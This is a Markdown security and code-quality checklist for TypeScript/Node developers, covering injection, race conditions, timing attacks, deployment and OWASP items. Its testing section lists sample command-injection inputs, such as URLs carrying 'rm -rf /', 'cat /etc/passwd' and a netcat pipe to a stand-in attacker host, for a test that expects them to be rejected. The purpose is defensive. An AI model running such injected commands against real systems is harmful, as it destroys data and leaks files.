# Security & Code Quality Checklist

Quick reference checklist for developers, code reviewers, and security auditors.

---

## 🔍 Pre-Commit Checklist

### Security Essentials

- [ ] **No hardcoded secrets** (API keys, passwords, tokens)
- [ ] **Input validation** on all user-provided data
- [ ] **No command injection** - never use `exec()` with user input
- [ ] **No SQL injection** - use parameterized queries
- [ ] **Timing-safe comparisons** for secrets/tokens
- [ ] **Proper error handling** - no silent failures
- [ ] **No sensitive data in logs** - redact passwords, tokens, keys

### Authentication & Authorization

- [ ] **Verify permissions** before any operation
- [ ] **Consistent error messages** - prevent user enumeration
- [ ] **MFA enforcement** where required
- [ ] **Session validation** on every request
- [ ] **Token expiration** properly implemented
- [ ] **Password hashing** with bcrypt/argon2

### Concurrency & Race Conditions

- [ ] **Atomic operations** for counters and state changes
- [ ] **Database transactions** with appropriate isolation
- [ ] **Advisory locks** for critical sections
- [ ] **No check-then-act** patterns without locks
- [ ] **State validation** before operations

### Input/Output

- [ ] **Validate all inputs** with Zod or similar
- [ ] **Sanitize outputs** to prevent XSS
- [ ] **parseInt with radix** explicitly specified
- [ ] **URL validation** before external requests
- [ ] **File path validation** - no directory traversal

---

## 📋 Code Review Checklist

### Critical Issues to Catch

#### ❌ Command Injection
```typescript
// BAD
exec(`git clone ${url} ${path}`)

// GOOD
execFile('git', ['clone', url, path])
```

#### ❌ Race Conditions
```typescript
// BAD
const count = await get(key);
await set(key, count + 1);

// GOOD
await redis.incr(key);
```

#### ❌ User Enumeration
```typescript
// BAD
if (!user) throw new Error("User not found");
if (user.verified) throw new Error("Already verified");

// GOOD
if (!user || user.verified) return { success: true };
```

#### ❌ Timing Attacks
```typescript
// BAD
if (token === expected) { ... }

// GOOD
if (crypto.timingSafeEqual(Buffer.from(token), Buffer.from(expected))) { ... }
```

---

## 🧪 Testing Checklist

### Security Test Cases

- [ ] **Malicious input** (SQL injection, command injection, XSS)
- [ ] **Authentication bypass** attempts
- [ ] **Authorization escalation** attempts
- [ ] **Race condition** scenarios with concurrent requests
- [ ] **Rate limiting** behavior
- [ ] **Error message** information disclosure
- [ ] **Session management** edge cases

### Test Examples

```typescript
// Command Injection Tests
it('rejects malicious URLs', async () => {
  const malicious = [
    'http://evil.com; rm -rf /',
    'http://evil.com && cat /etc/passwd',
    'http://evil.com | nc attacker.com 1234'
  ];
  
  for (const url of malicious) {
    await expect(clone(url)).rejects.toThrow();
  }
});

// Race Condition Tests
it('handles concurrent increments', async () => {
  const promises = Array(100).fill(null).map(() => increment('key'));
  await Promise.all(promises);
  
  const count = await get('key');
  expect(count).toBe(100); // Not 99 or 101
});

// User Enumeration Tests
it('returns same error for existing and non-existing users', async () => {
  const error1 = await getError(() => login('exists@example.com', 'wrong'));
  const error2 = await getError(() => login('notexist@example.com', 'wrong'));
  
  expect(error1.message).toBe(error2.message);
});
```

---

## 🚀 Deployment Checklist

### Pre-Deployment

- [ ] **All tests passing** (unit, integration, e2e)
- [ ] **No linter errors** or security warnings
- [ ] **Dependencies updated** and scanned for vulnerabilities
- [ ] **Secrets rotation** completed if needed
- [ ] **Database migrations** tested
- [ ] **Rollback plan** documented

### Security Configuration

- [ ] **HTTPS enforced** everywhere
- [ ] **Rate limiting** configured
- [ ] **CORS properly** configured
- [ ] **Security headers** set (CSP, HSTS, etc.)
- [ ] **Error pages** don't leak information
- [ ] **Logging** configured properly

### Monitoring

- [ ] **Error tracking** enabled (Sentry, etc.)
- [ ] **Performance monitoring** enabled
- [ ] **Security alerts** configured
- [ ] **Audit logging** enabled
- [ ] **Metrics dashboards** ready

---

## 🔐 Specific Pattern Checks

### Command Execution

```typescript
✅ DO:
import { execFile } from 'child_process';
await execFile('git', ['clone', url, path]);

❌ DON'T:
exec(`git clone ${url} ${path}`);
```

### Database Operations

```typescript
✅ DO:
await db.transaction(async (tx) => {
  await tx.raw("SELECT pg_advisory_xact_lock(?)", [lockId]);
  // Critical operation here
});

❌ DON'T:
const exists = await db.findOne({ name });
if (!exists) {
  await db.create({ name }); // Race condition!
}
```

### Concurrency Control

```typescript
✅ DO:
const count = await redis.incr(key);
await redis.expire(key, ttl);

❌ DON'T:
const count = await redis.get(key);
await redis.set(key, parseInt(count || '0') + 1);
```

### Authentication Checks

```typescript
✅ DO:
const currentAuth = auth; // Capture reference
if (!currentAuth) return;
const { userId } = currentAuth;

❌ DON'T:
if (!auth) return;
const { userId } = auth; // Could be null now!
```

### Secret Comparison

```typescript
✅ DO:
import crypto from 'crypto';
crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b));

❌ DON'T:
if (token === expectedToken) { ... }
```

### Error Handling

```typescript
✅ DO:
try {
  await operation();
} catch (error) {
  logger.error(sanitize(error), 'Operation failed');
  throw new AppError({ message: 'Operation failed' });
}

❌ DON'T:
try {
  await operation();
} catch (error) {
  // Silent failure
}
```

---

## 📊 Metrics to Track

### Security Metrics

- [ ] **Authentication failures** per hour
- [ ] **Authorization denials** per hour
- [ ] **Rate limit hits** per hour
- [ ] **Failed input validations** per hour
- [ ] **Security exceptions** per day

### Performance Metrics

- [ ] **Response time** percentiles (p50, p95, p99)
- [ ] **Error rate** percentage
- [ ] **Database query time**
- [ ] **External API latency**
- [ ] **Resource utilization** (CPU, memory)

### Quality Metrics

- [ ] **Test coverage** > 80%
- [ ] **Security test coverage** > 90%
- [ ] **Code review completion** 100%
- [ ] **Linter compliance** 100%
- [ ] **Technical debt** tickets < 10%

---

## 🎯 Common Vulnerabilities to Avoid

### OWASP Top 10 Checklist

1. **Broken Access Control**
   - [ ] Check permissions before every operation
   - [ ] Validate resource ownership
   - [ ] Implement proper RBAC

2. **Cryptographic Failures**
   - [ ] Use strong encryption (AES-256)
   - [ ] Proper key management
   - [ ] TLS 1.2+ only

3. **Injection**
   - [ ] Parameterized queries
   - [ ] Input validation
   - [ ] Output encoding

4. **Insecure Design**
   - [ ] Threat modeling done
   - [ ] Security requirements defined
   - [ ] Defense in depth

5. **Security Misconfiguration**
   - [ ] Secure defaults
   - [ ] No debug mode in production
   - [ ] Remove unused features

6. **Vulnerable Components**
   - [ ] Dependencies up to date
   - [ ] Vulnerability scanning
   - [ ] License compliance

7. **Authentication Failures**
   - [ ] MFA available
   - [ ] Strong password policy
   - [ ] Account lockout

8. **Data Integrity Failures**
   - [ ] Signed/encrypted data
   - [ ] CI/CD pipeline security
   - [ ] Input validation

9. **Logging Failures**
   - [ ] Security events logged
   - [ ] Logs protected
   - [ ] Monitoring/alerting

10. **SSRF**
    - [ ] URL validation
    - [ ] Network segmentation
    - [ ] Allowlist approach

---

## 🛠️ Tools & Automation

### Required Tools

- [ ] **ESLint** with security rules
- [ ] **TypeScript** strict mode
- [ ] **npm audit** in CI/CD
- [ ] **Snyk** or similar for dependencies
- [ ] **SonarQube** for code quality

### Optional but Recommended

- [ ] **OWASP ZAP** for dynamic testing
- [ ] **Burp Suite** for manual testing
- [ ] **Trivy** for container scanning
- [ ] **GitLeaks** for secret scanning
- [ ] **Dependabot** for auto-updates

---

## 📝 Documentation Requirements

### Code Documentation

- [ ] **Security considerations** documented
- [ ] **Threat model** for sensitive features
- [ ] **API security** requirements listed
- [ ] **Known limitations** documented
- [ ] **Mitigation strategies** described

### Operations Documentation

- [ ] **Incident response** procedure
- [ ] **Security configuration** guide
- [ ] **Monitoring setup** guide
- [ ] **Backup/restore** procedures
- [ ] **Disaster recovery** plan

---

## ⚡ Quick Security Fixes

### If You Find These Issues

| Issue | Quick Fix | Time |
|-------|-----------|------|
| `exec()` with user input | Replace with `execFile()` | 15 min |
| Missing input validation | Add Zod schema | 30 min |
| Hardcoded secret | Move to env var | 15 min |
| Non-atomic increment | Use Redis INCR | 30 min |
| Race condition | Add advisory lock | 1 hour |
| User enumeration | Unify error messages | 30 min |
| Timing attack | Use timingSafeEqual | 15 min |
| Missing error handling | Add try-catch with logging | 30 min |

---

## 🎓 Training Resources

### Must Read

- [ ] [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [ ] [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [ ] [TypeScript Security](https://www.typescriptlang.org/docs/handbook/security.html)
- [ ] [Fastify Security](https://www.fastify.io/docs/latest/Guides/Security/)

### Recommended

- [ ] [Secure Coding Guidelines](https://wiki.sei.cmu.edu/confluence/display/seccode/SEI+CERT+Coding+Standards)
- [ ] [Web Security Academy](https://portswigger.net/web-security)
- [ ] [Crypto 101](https://www.crypto101.io/)
- [ ] [Security Headers](https://securityheaders.com/)

---

**Remember:** Security is everyone's responsibility. When in doubt, ask the security team!

**Last Updated:** 2025-10-08  
**Next Review:** Monthly
